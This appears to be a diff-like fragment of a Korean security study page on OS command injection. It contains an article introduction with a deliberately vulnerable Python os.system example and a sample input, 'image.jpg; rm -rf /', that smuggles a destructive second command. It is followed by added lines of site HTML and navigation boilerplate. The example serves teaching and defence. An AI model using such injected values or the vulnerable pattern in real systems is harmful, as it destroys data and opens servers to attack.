라이브러리 인자 인젝션 </span> </a> <nav class=md-nav aria-label="이미지/미디어 라이브러리 인자 인젝션"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#imagemagick--imagetragick-cve-2016-3714 class=md-nav__link> <span class=md-ellipsis> ImageMagick — ImageTragick (CVE-2016-3714) </span> </a> </li> <li class=md-nav__item> <a href=#ffmpeg-인자-인젝션 class=md-nav__link> <span class=md-ellipsis> ffmpeg 인자 인젝션 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#blind-명령-인젝션-탐지 class=md-nav__link> <span class=md-ellipsis> Blind 명령 인젝션 탐지 </span> </a> <nav class=md-nav aria-label="Blind 명령 인젝션 탐지"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#시간-지연-기반-탐지 class=md-nav__link> <span class=md-ellipsis> 시간 지연 기반 탐지 </span> </a> </li> <li class=md-nav__item> <a href=#out-of-bandoob-콜백 class=md-nav__link> <span class=md-ellipsis> Out-of-Band(OOB) 콜백 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#방어-방법 class=md-nav__link> <span class=md-ellipsis> 방어 방법 </span> </a> <nav class=md-nav aria-label="방어 방법"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-셸을-호출하지-않는다 class=md-nav__link> <span class=md-ellipsis> 1. 셸을 호출하지 않는다 </span> </a> </li> <li class=md-nav__item> <a href=#2-외부-명령을-아예-호출하지-않는다 class=md-nav__link> <span class=md-ellipsis> 2. 외부 명령을 아예 호출하지 않는다 </span> </a> </li> <li class=md-nav__item> <a href=#3-인자에-들어갈-값은-allowlist로-제한 class=md-nav__link> <span class=md-ellipsis> 3. 인자에 들어갈 값은 allowlist로 제한 </span> </a> </li> <li class=md-nav__item> <a href=#4-인자-앞에----또는-경로-prefix를-붙인다 class=md-nav__link> <span class=md-ellipsis> 4. 인자 앞에 -- 또는 경로 prefix를 붙인다 </span> </a> </li> <li class=md-nav__item> <a href=#5-최소-권한으로-실행 class=md-nav__link> <span class=md-ellipsis> 5. 최소 권한으로 실행 </span> </a> </li> <li class=md-nav__item> <a href=#6-미디어-라이브러리-정책-강화 class=md-nav__link> <span class=md-ellipsis> 6. 미디어 라이브러리 정책 강화 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#사고-사례에서-배우는-것 class=md-nav__link> <span class=md-ellipsis> 사고 사례에서 배우는 것 </span> </a> </li> <li class=md-nav__item> <a href=#코드-리뷰-시-확인-포인트 class=md-nav__link> <span class=md-ellipsis> 코드 리뷰 시 확인 포인트 </span> </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <nav class=md-tags> <span class=md-tag>security</span> </nav> <h1 id=os-command-injection>OS Command Injection<a class=headerlink href=#os-command-injection title="Permanent link">&para;</a></h1> <p>사용자 입력이 OS 셸에 전달되어 임의 명령으로 실행되는 공격이다. SQL Injection이 DB를 노린다면, Command Injection은 서버 자체를 노린다. 한 번 성공하면 RCE(Remote Code Execution)로 직결되기 때문에 CVSS 점수가 거의 항상 9점 이상이다.</p> <p>가장 골치 아픈 점은 개발자가 의도적으로 셸을 호출하는 경우보다, 라이브러리 내부에서 몰래 셸을 호출하는 경우가 더 많다는 것이다. 이미지 변환, PDF 생성, 파일 압축, 동영상 처리 코드는 거의 다 내부에서 외부 바이너리를 fork+exec한다. 이 과정에서 인자 한 줄이 셸을 거쳐 가면 그 순간부터 공격 표면이 된다.</p> <hr> <h2 id=공격이-성립하는-근본-원인>공격이 성립하는 근본 원인<a class=headerlink href=#공격이-성립하는-근본-원인 title="Permanent link">&para;</a></h2> <div class="language-python highlight"><pre><span></span><code><span id=__span-0-1><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=c1># 흔한 잘못된 코드 — Python</span>
-</span><span id=__span-0-2><a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a><span class=kn>import</span><span class=w> </span><span class=nn>os</span>
-</span><span id=__span-0-3><a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=n>filename</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span>
-</span><span id=__span-0-4><a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;convert </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2> output.webp&quot;</span><span class=p>)</span>
-</span><span id=__span-0-5><a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a>
-</span><span id=__span-0-6><a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a><span class=c1># filename = &quot;image.webp&quot;           →  정상</span>
-</span><span id=__span-0-7><a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a><span class=c1># filename = &quot;image.jpg; rm -rf /&quot; →  명령 두 개가 실행됨</span>
-</span></code></pre></div> <p>핵심은 두 가지다. 첫째, 사용자 입력이 셸 명령 문자열에 그대로 들어간다. 둘째, 그 문자열을 <code>/bin/sh -c "..."</code> 형태로 셸에 넘긴다. 셸은 자기에게 넘어온 문자열을 파싱해서 메타문자를 해석하기 때문에, 입력에 섞인 <code>;</code>나 <code>|</code>가 명령 구분자로 동작한다.</p> <p>OS 입장에서는 자기가 받은 명령을 충실히 실행할 뿐이다. 어디까지가 개발자 의도이고 어디부터 공격자 입력인지 구분할 방법이 없다. 이걸 구분해주는 게 <code>exec</code> 계열 함수에서 인자를 배열로 분리해서 넘기는 방식, 즉 셸을 거치지 않는 호출이다.</p> <pre class=mermaid-diagram><code>sequenceDiagram
+
+<!doctype html>
+<html lang="ko" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="백엔드 엔지니어 강영규의 기술 노트 — 시스템과 인프라, 그 사이의 모든 것">
+      
+      
+        <meta name="author" content="GYUTORY">
+      
+      
+        <link rel="canonical" href="https://gyutory.github.io/YGSTUDY/Security/Command_Injection/">
+      
+      
+        <link rel="prev" href="../Clickjacking/">
+      
+      
+        <link rel="next" href="../Insecure_Deserialization/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS 피드 생성완료" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS 피드 업데이트완료" href="../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Command Injection - YGSTUDY</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#os-command-injection" class="md-skip">
+          콘텐츠로 이동
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="상단/헤더">
+    <a href="../.." title="YGSTUDY" class="md-header__button md-logo" aria-label="YGSTUDY" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m19 2-5 4.5v11l5-4.5zM6.5 5C4.55 5 2.45 5.4 1 6.5v14.66c0 .25.25.5.5.5.1 0 .15-.07.25-.07 1.35-.65 3.3-1.09 4.75-1.09 1.95 0 4.05.4 5.5 1.5 1.35-.85 3.8-1.5 5.5-1.5 1.65 0 3.35.31 4.75 1.06.1.05.15.03.25.03.25 0 .5-.25.5-.5V6.5c-.6-.45-1.25-.75-2-1V19c-1.1-.35-2.3-.5-3.5-.5-1.7 0-4.15.65-5.5 1.5V6.5C10.55 5.4 8.45 5 6.5 5"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            YGSTUDY
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Command Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="blue"  aria-label="다크 모드로 전환"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="다크 모드로 전환" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="blue"  aria-label="라이트 모드로 전환"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="라이트 모드로 전환" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="검색" placeholder="검색" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="검색">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="공유" aria-label="공유" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="지우기" aria-label="지우기" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            검색 초기화
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/gyutory/YGSTUDY" title="저장소로 이동" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    gyutory/YGSTUDY
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="네비게이션" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="YGSTUDY" class="md-nav__button md-logo" aria-label="YGSTUDY" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m19 2-5 4.5v11l5-4.5zM6.5 5C4.55 5 2.45 5.4 1 6.5v14.66c0 .25.25.5.5.5.1 0 .15-.07.25-.07 1.35-.65 3.3-1.09 4.75-1.09 1.95 0 4.05.4 5.5 1.5 1.35-.85 3.8-1.5 5.5-1.5 1.65 0 3.35.31 4.75 1.06.1.05.15.03.25.03.25 0 .5-.25.5-.5V6.5c-.6-.45-1.25-.75-2-1V19c-1.1-.35-2.3-.5-3.5-.5-1.7 0-4.15.65-5.5 1.5V6.5C10.55 5.4 8.45 5 6.5 5"/></svg>
+
+    </a>
+    YGSTUDY
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/gyutory/YGSTUDY" title="저장소로 이동" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    gyutory/YGSTUDY
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    YGSTUDY
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%EC%B5%9C%EA%B7%BC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    최근 변경 문서
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../Language/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Language
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../Framework/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Backend
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../DataBase/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Database
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../Cloud/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Infra
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CS
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../Network/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../OS/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../Algorithm/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Algorithm
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_4" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7_4" id="__nav_7_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Security
+  
+
+          </label>
